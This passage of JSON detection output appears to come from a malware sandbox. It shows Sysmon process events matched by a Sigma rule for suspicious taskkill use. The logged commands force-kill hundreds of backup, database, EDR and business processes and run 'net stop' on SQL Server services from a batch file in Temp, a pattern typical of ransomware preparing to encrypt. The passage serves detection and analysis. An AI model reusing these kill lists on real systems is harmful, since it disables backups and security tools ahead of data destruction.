                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3380-642A-D00D-000000004A00}; ProcessId=6052; Product=Microsoft\\xae Windows\\xae Operating System; Description=Terminates Processes; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3378-642A-C90C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15E2E0ACD891510C6268CB8899F2A1A1,SHA256=F328D587561BEED3C19289FBA43E284FB57BCE1A4C202C7379673964F9B8610D,IMPHASH=0D3E23DCB6BF63A9EB90D5BED57B4F89; OriginalFileName=taskkill.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4976; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=taskkill  /IM TsService.exe /F ; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\taskkill.exe; IntegrityLevel=High; ParentCommandLine=cmd  /c \"color e \u0026 @taskkill /IM BackupExec.exe /F \u0026 @taskkill /IM Att.exe /F \u0026 @taskkill /IM mdm.exe /F \u0026 @taskkill /IM BackupExecManagementService.exe /F \u0026 @taskkill /IM bengine.exe /F \u0026 @taskkill /IM benetns.exe /F \u0026 @taskkill /IM beserver.exe /F \u0026 @taskkill /IM pvlsvr.exe /F \u0026 @taskkill /IM bedbg.exe /F \u0026 @taskkill /IM beremote.exe /F \u0026 @taskkill /IM beremote.exe /F \u0026 @taskkill /IM beremote.exe /F \u0026 @taskkill /IM beremote.exe /F \u0026 @taskkill /IM RemoteAssistProcess.exe /F \u0026 @taskkill /IM BarMoniService.exe /F \u0026 @taskkill /IM GoodGameSrv.exe /F \u0026 @taskkill /IM BarCMService.exe /F \u0026 @taskkill /IM TsService.exe /F \u0026 @taskkill /IM GoodGame.exe /F \u0026 @taskkill /IM BarServerView.exe /F \u0026 @taskkill /IM IcafeServicesTray.exe /F \u0026 @taskkill /IM BsAgent_0.exe /F \u0026 @taskkill /IM ControlServer.exe /F \u0026 @taskkill /IM DisklessServer.exe /F \u0026 @taskkill /IM DumpServer.exe /F \u0026 @taskkill /IM NetDiskServer.exe /F \u0026 @taskkill /IM PersonUDisk.exe /F \u0026 @taskkill /IM service_agent.exe /F \u0026 @taskkill /IM SoftMemory.exe /F \u0026 @taskkill /IM BarServer.exe /F \u0026 @taskkill /IM RtkNGUI64.exe /F \u0026 @taskkill /IM Serv-U-Tray.exe /F \u0026 @taskkill /IM QQPCSoftTrayTips.exe /F \u0026 @taskkill /IM SohuNews.exe /F \u0026 @taskkill /IM Serv-U.exe /F \u0026 @taskkill /IM QQPCRTP.exe /F \u0026 @taskkill /IM EasyFZS.exe /F \u0026 @taskkill /IM HaoYiShi.exe /F \u0026 @taskkill /IM HysMySQL.exe /F \u0026 @taskkill /IM wtautoreg.exe /F \u0026 @taskkill /IM ispiritPro.exe /F \u0026 @taskkill /IM CAService.exe /F \u0026 @taskkill /IM XAssistant.exe /F \u0026 @taskkill /IM TrustCA.exe /F \u0026 @taskkill /IM GEUU20003.exe /F \u0026 @taskkill /IM CertMgr.exe /F \u0026 @taskkill /IM eSafe_monitor.exe /F \u0026 @taskkill /IM MainExecute.exe /F \u0026 @taskkill /IM FastInvoice.exe /F \u0026 @taskkill /IM SoftMgrLite.exe /F \u0026 @taskkill /IM sesvc.exe /F \u0026 @taskkill /IM ScanFileServer.exe /F \u0026 @taskkill /IM Nuoadehgcgcd.exe /F \u0026 @taskkill /IM OpenFastAssist.exe /F \u0026 @taskkill /IM FastInvoiceAssist.exe /F \u0026 @taskkill /IM Nuoadfaggcje.exe /F \u0026 @taskkill /IM OfficeUpdate.exe /F \u0026 @taskkill /IM atkexComSvc.exe /F \u0026 @taskkill /IM FileTransferAgent.exe /F \u0026 @taskkill /IM MasterReplicatorAgent.exe /F \u0026 @taskkill /IM CrmAsyncService.exe /F \u0026 @taskkill /IM CrmAsyncService.exe /F \u0026 @taskkill /IM CrmUnzipService.exe /F \u0026 @taskkill /IM NscAuthService.exe /F \u0026 @taskkill /IM ReplicaReplicatorAgent.exe /F \u0026 @taskkill /IM ASMCUSvc.exe /F \u0026 @taskkill /IM OcsAppServerHost.exe /F \u0026 @taskkill /IM RtcCdr.exe /F \u0026 @taskkill /IM IMMCUSvc.exe /F \u0026 @taskkill /IM DataMCUSvc.exe /F \u0026 @taskkill /IM MeetingMCUSvc.exe /F \u0026 @taskkill /IM QmsSvc.exe /F \u0026 @taskkill /IM RTCSrv.exe /F \u0026 @taskkill /IM pnopagw.exe /F \u0026 @taskkill /IM NscAuth.exe /F \u0026 @taskkill /IM Microsoft.ActiveDirectory.WebServices.exe /F \u0026 @taskkill /IM DistributedCacheService.exe /F \u0026 @taskkill /IM c2wtshost.exe /F \u0026 @taskkill /IM Microsoft.Office.Project.Server.Calculation.exe /F \u0026 @taskkill /IM schedengine.exe /F \u0026 @taskkill /IM Microsoft.Office.Project.Server.Eventing.exe /F \u0026 @taskkill /IM Microsoft.Office.Project.Server.Queuing.exe /F \u0026 @taskkill /IM WSSADMIN.EXE /F \u0026 @taskkill /IM hostcontrollerservice.exe /F \u0026 @taskkill /IM noderunner.exe /F \u0026 @taskkill /IM OWSTIMER.EXE /F \u0026 @taskkill /IM wsstracing.exe /F \u0026 @taskkill /IM mssearch.exe /F \u0026 @taskkill /IM MySQLInstallerConsole.exe /F \u0026 @taskkill /IM EXCEL.EXE /F \u0026 @taskkill /IM consent.exe /F \u0026 @taskkill /IM RtkAudioService64.exe /F \u0026 @taskkill /IM RAVBg64.exe /F \u0026 @taskkill /IM FNPLicensingService64.exe /F \u0026 @taskkill /IM VisualSVNServer.exe /F \u0026 @taskkill /IM MotionBoard57.exe /F \u0026 @taskkill /IM MotionBoardRCService57.exe /F \u0026 @taskkill /IM LPManService.exe /F \u0026 @taskkill /IM RaRegistry.exe /F \u0026 @taskkill /IM RaAutoInstSrv.exe /F \u0026 @taskkill /IM RtHDVCpl.exe /F \u0026 @taskkill /IM DefenderDaemon.exe /F \u0026 @taskkill /IM BestSyncApp.exe /F \u0026 @taskkill /IM ApUI.exe /F \u0026 @taskkill /IM AutoUpdate.exe /F \u0026 @taskkill /IM LPManNotifier.exe /F \u0026 @taskkill /IM FieldAnalyst.exe /F \u0026 @taskkill /IM TimingGenerate.exe /F \u0026 @taskkill /IM Detector.exe /F \u0026 @taskkill /IM Estimator.exe /F \u0026 @taskkill /IM FA_Logwriter.exe /F \u0026 @taskkill /IM TrackingSrv.exe /F \u0026 @taskkill /IM cbInterface.exe /F \u0026 @taskkill /IM EnterprisePortal.exe /F \u0026 @taskkill /IM ccbService.exe /F \u0026 @taskkill /IM monitor.exe /F \u0026 @taskkill /IM U8DispatchService.exe /F \u0026 @taskkill /IM dbsrv16.exe /F \u0026 @taskkill /IM sqlservr.exe /F \u0026 @taskkill /IM KICManager.exe /F \u0026 @taskkill /IM KICMain.exe /F \u0026 @taskkill /IM ServerManagerLauncher.exe /F \u0026 @taskkill /IM TbossGate.exe /F \u0026 @taskkill /IM iusb3mon.exe /F \u0026 @taskkill /IM MgrEnvSvc.exe /F \u0026 @taskkill /IM Mysoft.Config.WindowsService.exe /F \u0026 @taskkill /IM Mysoft.UpgradeService.UpdateService.exe /F \u0026 @taskkill /IM hasplms.exe /F \u0026 @taskkill /IM Mysoft.Setup.InstallService.exe /F \u0026 @taskkill /IM Mysoft.UpgradeService.Dispatcher.exe /F \u0026 @taskkill /IM Mysoft.DataCenterService.WindowsHost.exe /F \u0026 @taskkill /IM Mysoft.DataCenterService.DataCleaning.exe /F \u0026 @taskkill /IM Mysoft.DataCenterService.DataTracking.exe /F \u0026 @taskkill /IM Mysoft.SchedulingService.WindowsHost.exe /F \u0026 @taskkill /IM ServiceMonitor.exe /F \u0026 @taskkill /IM Mysoft.SchedulingService.ExecuteEngine.exe /F \u0026 @taskkill /IM AgentX.exe /F \u0026 @taskkill /IM host.exe /F \u0026 @taskkill /IM AutoUpdate.exe /F \u0026 @taskkill /IM vsjitdebugger.exe /F\"; UtcTime=1680487296; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3380-642A-D20D-000000004A00}; ProcessId=6292; Product=Microsoft\\xae Windows\\xae Operating System; Description=Terminates Processes; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3378-642A-BD0C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15E2E0ACD891510C6268CB8899F2A1A1,SHA256=F328D587561BEED3C19289FBA43E284FB57BCE1A4C202C7379673964F9B8610D,IMPHASH=0D3E23DCB6BF63A9EB90D5BED57B4F89; OriginalFileName=taskkill.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6340; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=taskkill  /IM redis-server.exe /F ; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\taskkill.exe; IntegrityLevel=High; ParentCommandLine=cmd  /c \"color e \u0026 @taskkill /IM pg_ctl.exe /F \u0026 @taskkill /IM rcrelay.exe /F \u0026 @taskkill /IM SogouImeBroker.exe /F \u0026 @taskkill /IM CCenter.exe /F \u0026 @taskkill /IM ScanFrm.exe /F \u0026 @taskkill /IM d_manage.exe /F \u0026 @taskkill /IM RsTray.exe /F \u0026 @taskkill /IM wampmanager.exe /F \u0026 @taskkill /IM RavTray.exe /F \u0026 @taskkill /IM mssearch.exe /F \u0026 @taskkill /IM sqlmangr.exe /F \u0026 @taskkill /IM msftesql.exe /F \u0026 @taskkill /IM SyncBaseSvr.exe /F \u0026 @taskkill /IM oracle.exe /F \u0026 @taskkill /IM TNSLSNR.exe /F \u0026 @taskkill /IM SyncBaseConsole.exe /F \u0026 @taskkill /IM aspnet_state.exe /F \u0026 @taskkill /IM AutoBackUpEx.exe /F \u0026 @taskkill /IM redis-server.exe /F \u0026 @taskkill /IM MySQLNotifier.exe /F \u0026 @taskkill /IM oravssw.exe /F \u0026 @taskkill /IM fppdis5.exe /F \u0026 @taskkill /IM His6Service.exe /F \u0026 @taskkill /IM dinotify.exe /F \u0026 @taskkill /IM JhTask.exe /F \u0026 @taskkill /IM Executer.exe /F \u0026 @taskkill /IM AllPassCBHost.exe /F \u0026 @taskkill /IM ap_nginx.exe /F \u0026 @taskkill /IM AndroidServer.exe /F \u0026 @taskkill /IM XT.exe /F \u0026 @taskkill /IM XTService.exe /F \u0026 @taskkill /IM AllPassMCService.exe /F \u0026 @taskkill /IM IMEDICTUPDATE.exe /F \u0026 @taskkill /IM FlashHelperService.exe /F \u0026 @taskkill /IM ap_redis-server.exe /F \u0026 @taskkill /IM UtilDev.WebServer.Monitor.exe /F \u0026 @taskkill /IM UWS.AppHost.Clr2.x86.exe /F \u0026 @taskkill /IM FoxitProtect.exe /F \u0026 @taskkill /IM ftnlses.exe /F \u0026 @taskkill /IM ftusbrdwks.exe /F \u0026 @taskkill /IM ftusbrdsrv.exe /F \u0026 @taskkill /IM ftnlsv.exe /F \u0026 @taskkill /IM Syslogd_Service.exe /F \u0026 @taskkill /IM UWS.HighPrivilegeUtilities.exe /F \u0026 @taskkill /IM ftusbsrv.exe /F \u0026 @taskkill /IM UWS.LowPrivilegeUtilities.exe /F \u0026 @taskkill /IM UWS.AppHost.Clr2.AnyCpu.exe /F \u0026 @taskkill /IM winguard_x64.exe /F \u0026 @taskkill /IM vmconnect.exe /F \u0026 @taskkill /IM UWS.AppHost.Clr2.x86.exe /F \u0026 @taskkill /IM firefox.exe /F \u0026 @taskkill /IM usbrdsrv.exe /F \u0026 @taskkill /IM usbserver.exe /F \u0026 @taskkill /IM Foxmail.exe /F \u0026 @taskkill /IM qemu-ga.exe /F \u0026 @taskkill /IM wwbizsrv.exe /F \u0026 @taskkill /IM ZTEFileTranS.exe /F \u0026 @taskkill /IM ZTEUsbIpc.exe /F \u0026 @taskkill /IM ZTEUsbIpcGuard.exe /F \u0026 @taskkill /IM AlibabaProtect.exe /F \u0026 @taskkill /IM kbasesrv.exe /F \u0026 @taskkill /IM ZTEVdservice.exe /F \u0026 @taskkill /IM MMRHookService.exe /F \u0026 @taskkill /IM extjob.exe /F \u0026 @taskkill /IM IpOverUsbSvc.exe /F \u0026 @taskkill /IM VMwareTray.exe /F \u0026 @taskkill /IM devenv.exe /F \u0026 @taskkill /IM PerfWatson2.exe /F \u0026 @taskkill /IM ServiceHub.Host.Node.x86.exe /F \u0026 @taskkill /IM ServiceHub.IdentityHost.exe /F \u0026 @taskkill /IM ServiceHub.VSDetouredHost.exe /F \u0026 @taskkill /IM ServiceHub.SettingsHost.exe /F \u0026 @taskkill /IM ServiceHub.Host.CLR.x86.exe /F \u0026 @taskkill /IM ServiceHub.RoslynCodeAnalysisService32.exe /F \u0026 @taskkill /IM ServiceHub.DataWarehouseHost.exe /F \u0026 @taskkill /IM Microsoft.VisualStudio.Web.Host.exe /F \u0026 @taskkill /IM SQLEXPRWT.exe /F \u0026 @taskkill /IM setup.exe /F \u0026 @taskkill /IM remote.exe /F \u0026 @taskkill /IM setup100.exe /F \u0026 @taskkill /IM landingpage.exe /F \u0026 @taskkill /IM WINWORD.exe /F \u0026 @taskkill /IM KuaiYun.exe /F \u0026 @taskkill /IM HwsHostPanel.exe /F \u0026 @taskkill /IM NovelSpider.exe /F \u0026 @taskkill /IM Service_KMS.exe /F \u0026 @taskkill /IM WebServer.exe /F \u0026 @taskkill /IM ChsIME.exe /F \u0026 @taskkill /IM btPanel.exe /F \u0026 @taskkill /IM Protect_2345Explorer.exe /F \u0026 @taskkill /IM Pic_2345Svc.exe /F \u0026 @taskkill /IM vmware-converter-a.exe /F \u0026 @taskkill /IM vmware-converter.exe /F \u0026 @taskkill /IM vmware.exe /F \u0026 @taskkill /IM vmware-unity-helper.exe /F \u0026 @taskkill /IM vmware-vmx.exe /F \u0026 @taskkill /IM vmware-vmx.exe /F \u0026 @taskkill /IM usysdiag.exe /F \u0026 @taskkill /IM PopBlock.exe /F \u0026 @taskkill /IM gsinterface.exe /F \u0026 @taskkill /IM Gemstar.Group.CRS.Client.exe /F \u0026 @taskkill /IM TenpayServer.exe /F \u0026 @taskkill /IM RemoteExecService.exe /F \u0026 @taskkill /IM VS_TrueCorsManager.exe /F \u0026 @taskkill /IM ntpsvr-2019-01-22-wgs84.exe /F \u0026 @taskkill /IM rtkjob-ion.exe /F \u0026 @taskkill /IM ntpsvr-2019-01-22-no-usrcheck.exe /F \u0026 @taskkill /IM NtripCaster-2019-01-08.exe /F \u0026 @taskkill /IM BACSTray.exe /F \u0026 @taskkill /IM protect.exe /F \u0026 @taskkill /IM hfs.exe /F \u0026 @taskkill /IM jzmis.exe /F \u0026 @taskkill /IM NewFileTime_x64.exe /F \u0026 @taskkill /IM 2345MiniPage.exe /F \u0026 @taskkill /IM JMJ_server.exe /F \u0026 @taskkill /IM cacls.exe /F \u0026 @taskkill /IM gpsdaemon.exe /F \u0026 @taskkill /IM gpsusersvr.exe /F \u0026 @taskkill /IM gpsdownsvr.exe /F \u0026 @taskkill /IM gpsstoragesvr.exe /F \u0026 @taskkill /IM gpsdataprocsvr.exe /F \u0026 @taskkill /IM gpsftpd.exe /F \u0026 @taskkill /IM gpsmysqld.exe /F \u0026 @taskkill /IM gpstomcat6.exe /F \u0026 @taskkill /IM gpsloginsvr.exe /F \u0026 @taskkill /IM gpsmediasvr.exe /F \u0026 @taskkill /IM gpsgatewaysvr.exe /F \u0026 @taskkill /IM gpssvrctrl.exe /F \u0026 @taskkill /IM zabbix_agentd.exe /F\"; UtcTime=1680487296; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3381-642A-FE0D-000000004A00}; ProcessId=6232; Product=Microsoft\\xae Windows\\xae Operating System; Description=Terminates Processes; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3379-642A-D60C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15E2E0ACD891510C6268CB8899F2A1A1,SHA256=F328D587561BEED3C19289FBA43E284FB57BCE1A4C202C7379673964F9B8610D,IMPHASH=0D3E23DCB6BF63A9EB90D5BED57B4F89; OriginalFileName=taskkill.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=1324; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=taskkill  /IM edr_agent.exe /F ; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\taskkill.exe; IntegrityLevel=High; ParentCommandLine=cmd  /c \"color e \u0026 @taskkill /IM VBoxSDS.exe /F \u0026 @taskkill /IM mysqld.exe /F \u0026 @taskkill /IM TeamViewer_Service.exe /F \u0026 @taskkill /IM TeamViewer.exe /F \u0026 @taskkill /IM CasLicenceServer.exe /F \u0026 @taskkill /IM tv_w32.exe /F \u0026 @taskkill /IM tv_x64.exe /F \u0026 @taskkill /IM rdm.exe /F \u0026 @taskkill /IM SecureCRT.exe /F \u0026 @taskkill /IM SecureCRTPortable.exe /F \u0026 @taskkill /IM VirtualBox.exe /F \u0026 @taskkill /IM VBoxSVC.exe /F \u0026 @taskkill /IM VirtualBoxVM.exe /F \u0026 @taskkill /IM abs_deployer.exe /F \u0026 @taskkill /IM edr_monitor.exe /F \u0026 @taskkill /IM sfupdatemgr.exe /F \u0026 @taskkill /IM ipc_proxy.exe /F \u0026 @taskkill /IM edr_agent.exe /F \u0026 @taskkill /IM edr_sec_plan.exe /F \u0026 @taskkill /IM sfavsvc.exe /F \u0026 @taskkill /IM DataShareBox.ShareBoxMonitorService.exe /F \u0026 @taskkill /IM DataShareBox.ShareBoxService.exe /F \u0026 @taskkill /IM Jointsky.CloudExchangeService.exe /F \u0026 @taskkill /IM Jointsky.CloudExchange.NodeService.ein /F \u0026 @taskkill /IM perl.exe /F \u0026 @taskkill /IM java.exe /F \u0026 @taskkill /IM emagent.exe /F \u0026 @taskkill /IM TsServer.exe /F \u0026 @taskkill /IM AppMain.exe /F \u0026 @taskkill /IM easservice.exe /F \u0026 @taskkill /IM Kingdee6.1.exe /F \u0026 @taskkill /IM QyKernel.exe /F \u0026 @taskkill /IM QyFragment.exe /F \u0026 @taskkill /IM UserClient.exe /F \u0026 @taskkill /IM GNCEFExternal.exe /F \u0026 @taskkill /IM GNCEFExternal.exe /F \u0026 @taskkill /IM GNCEFExternal.exe /F \u0026 @taskkill /IM ComputerZTray.exe /F \u0026 @taskkill /IM ComputerZService.exe /F \u0026 @taskkill /IM ClearCache.exe /F \u0026 @taskkill /IM ProLiantMonitor.exe /F \u0026 @taskkill /IM ChsIME.exe /F \u0026 @taskkill /IM bugreport.exe /F \u0026 @taskkill /IM GNWebServer.exe /F \u0026 @taskkill /IM UI0Detect.exe /F \u0026 @taskkill /IM GNCore.exe /F \u0026 @taskkill /IM gnwayDDNS.exe /F \u0026 @taskkill /IM GNWebHelper.exe /F \u0026 @taskkill /IM php-cgi.exe /F \u0026 @taskkill /IM ESLUSBService.exe /F \u0026 @taskkill /IM CQA.exe /F \u0026 @taskkill /IM Kekcoek.pif /F \u0026 @taskkill /IM Tinuknx.exe /F \u0026 @taskkill /IM servers.exe /F \u0026 @taskkill /IM ping.exe /F \u0026 @taskkill /IM TianHeng.exe /F \u0026 @taskkill /IM K3MobileService.exe /F \u0026 @taskkill /IM VSSVC.exe /F \u0026 @taskkill /IM Xshell.exe /F \u0026 @taskkill /IM XshellCore.exe /F \u0026 @taskkill /IM FNPLicensingService.exe /F \u0026 @taskkill /IM XYNTService.exe /F \u0026 @taskkill /IM U8DispatchService.exe /F \u0026 @taskkill /IM EISService.exe /F \u0026 @taskkill /IM UFSoft.U8.Framework.EncryptManager.exe /F \u0026 @taskkill /IM yonyou.u8.gc.taskmanager.servicebus.exe /F \u0026 @taskkill /IM U8KeyManagePool.exe /F \u0026 @taskkill /IM U8MPool.exe /F \u0026 @taskkill /IM U8SCMPool.exe /F \u0026 @taskkill /IM UFIDA.U8.Report.SLReportService.exe /F \u0026 @taskkill /IM U8TaskService.exe /F \u0026 @taskkill /IM U8TaskWorker.exe /F \u0026 @taskkill /IM U8WebPool.exe /F \u0026 @taskkill /IM U8AllAuthServer.exe /F \u0026 @taskkill /IM UFIDA.U8.UAP.ReportService.exe /F \u0026 @taskkill /IM UFIDA.U8.ECE.UTU.Services.exe /F \u0026 @taskkill /IM U8WorkerService.exe /F \u0026 @taskkill /IM UFIDA.U8.ECE.UTU.exe /F \u0026 @taskkill /IM ShellStub.exe /F \u0026 @taskkill /IM U8UpLoadTask.exe /F \u0026 @taskkill /IM UfSysHostingService.exe /F \u0026 @taskkill /IM UFIDA.UBF.SystemManage.ApplicationService.exe /F \u0026 @taskkill /IM UFIDA.U9.CS.Collaboration.MailService.exe /F \u0026 @taskkill /IM NotificationService.exe /F \u0026 @taskkill /IM UBFdevenv.exe /F \u0026 @taskkill /IM UFIDA.U9.SystemManage.SystemManagerClient.exe /F \u0026 @taskkill /IM mongod.exe /F \u0026 @taskkill /IM SpusCss.exe /F \u0026 @taskkill /IM UUDesktop.exe /F \u0026 @taskkill /IM KDHRServices.exe /F \u0026 @taskkill /IM Kingdee.K3.PUBLIC.BkgSvcHost.exe /F \u0026 @taskkill /IM Kingdee.K3.HR.Server.exe /F \u0026 @taskkill /IM Kingdee.K3.Mobile.Servics.exe /F \u0026 @taskkill /IM Kingdee.K3.PUBLIC.KDSvrMgrHost.exe /F \u0026 @taskkill /IM KDSvrMgrService.exe /F \u0026 @taskkill /IM pdfServer.exe /F \u0026 @taskkill /IM pdfspeedup.exe /F \u0026 @taskkill /IM SufAppServer.exe /F \u0026 @taskkill /IM tomcat5.exe /F \u0026 @taskkill /IM Kingdee.K3.Mobile.LightPushService.exe /F \u0026 @taskkill /IM iMTSSvcMgr.exe /F \u0026 @taskkill /IM kdmain.exe /F \u0026 @taskkill /IM KDActMGr.exe /F \u0026 @taskkill /IM Kingdee.DeskTool.exe /F \u0026 @taskkill /IM K3ServiceUpdater.exe /F \u0026 @taskkill /IM Aua.exe /F \u0026 @taskkill /IM iNethinkSQLBackup.exe /F \u0026 @taskkill /IM auaJW.exe /F \u0026 @taskkill /IM Scheduler.exe /F \u0026 @taskkill /IM bschJW.exe /F \u0026 @taskkill /IM SystemTray64.exe /F \u0026 @taskkill /IM OfficeDaemon.exe /F \u0026 @taskkill /IM OfficeIndex.exe /F \u0026 @taskkill /IM OfficeIm.exe /F \u0026 @taskkill /IM iNethinkSQLBackupConsole.exe /F \u0026 @taskkill /IM OfficeMail.exe /F \u0026 @taskkill /IM OfficeTask.exe /F \u0026 @taskkill /IM OfficePOP3.exe /F \u0026 @taskkill /IM apache.exe /F \u0026 @taskkill /IM GnHostService.exe /F /T \u0026 @taskkill /IM HwUVPUpgrade.exe /F /T \u0026 @taskkill /IM \"Kingdee.KIS.UESystemSer.exe\" /F /T \u0026 @taskkill /IM uvpmonitor.exe /F /T \u0026 @taskkill /IM UVPUpgradeService.exe /F /T \u0026 @taskkill /IM KDdataUpdate.exe /F /T \u0026 @taskkill /IM Portal.exe /F /T \u0026 @taskkill /IM U8SMSSrv.exe /F /T \u0026 @taskkill /IM \"Ufida.T.SM.PublishService.exe\" /F /T \u0026 @taskkill /IM lta8.exe /F /T \u0026 @taskkill /IM UfSvrMgr.exe /F /T \u0026 @taskkill /IM AutoUpdateService.exe /F /T \u0026 @taskkill /IM MOM.exe /F /T\"; UtcTime=1680487297; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "low",
                                                                       "rule_description":  "Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Execution of Taskkill",
                                                                       "rule_id":  "cd06da2f3978bdb24b3f3c8f83c7df917a910c6b29921d0e375e418f340d8f3d",
                                                                       "rule_author":  "frack113"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3371-642A-350C-000000004A00}; ProcessId=6984; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop MSSQLServerADHelper100; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487281; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3371-642A-360C-000000004A00}; ProcessId=4016; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3371-642A-350C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=-; ParentProcessId=6984; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\net1  stop MSSQLServerADHelper100; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  stop MSSQLServerADHelper100; UtcTime=1680487281; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3371-642A-370C-000000004A00}; ProcessId=5552; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop MSSQL$ISARS; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487281; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3371-642A-380C-000000004A00}; ProcessId=6600; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3371-642A-370C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=-; ParentProcessId=5552; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\system32\\net1  stop MSSQL$ISARS; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  stop MSSQL$ISARS; UtcTime=1680487281; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3371-642A-390C-000000004A00}; ProcessId=6272; Product=-; Description=-; Company=-; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=-; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=-; ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=net  stop MSSQL$MSFW; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487281; RuleName=-}"
                                                                                             },
                                                                                             {
